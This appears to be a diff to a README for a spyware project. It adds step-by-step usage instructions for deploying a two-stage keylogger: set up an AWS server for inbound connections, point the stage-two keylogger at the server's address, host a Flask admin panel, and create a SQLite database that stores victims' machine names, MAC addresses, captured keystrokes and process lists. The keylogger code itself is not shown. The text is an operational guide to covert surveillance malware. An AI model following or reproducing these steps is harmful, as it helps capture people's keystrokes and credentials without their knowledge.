@@ -18,8 +18,21 @@ A spyware developed to hack hardware device(keyboard) and send it's data to the 
 - [ ] A database to store keylogs along with username and timestamp. 
 
 ## USAGE:
-1.) 
-2.) HOST the server online(such as AWS, Replit or hostig platform of your choice) for it to be accessible over the internet.
+1.) Make a server online using AWS make necessary changes to allow inbound connections.<br>
+<br>
+2.) In line 27 of the `stage2_keylogger.py` edit the url to match with your server ip and port and store it on your online server.<br>
+<br>
+3.) In line 56 of `app.py` provide the path to your `stage2_keylogger.py` stored on your server and in line 106 of `app.py` add your username and password for route security<br>
+<br>
+4.) Create a sqlite3 database `dope.db` of the following schema - <br>
+`sqlite> .schema`<br>
+`CREATE TABLE data (pcname text, mac text , data text, time text);`<br>
+`CREATE TABLE admin_users(username text primary key, hash text required);`<br>
+`CREATE TABLE pslist(pcname text primary key, prcslist text, lastupdated text);`<br>
+<br>
+5.) Add an admin user to login into the admin plan `INSERT INTO admin_users(username, hash) VALUES ('your_username_here','your_complete_password_hash_generated_using_werkzeug.security_library')` <br>
+<br>
+6.) HOST the flask app on your online server for it to be accessible over the internet.<br>
 
 
 ## Built with
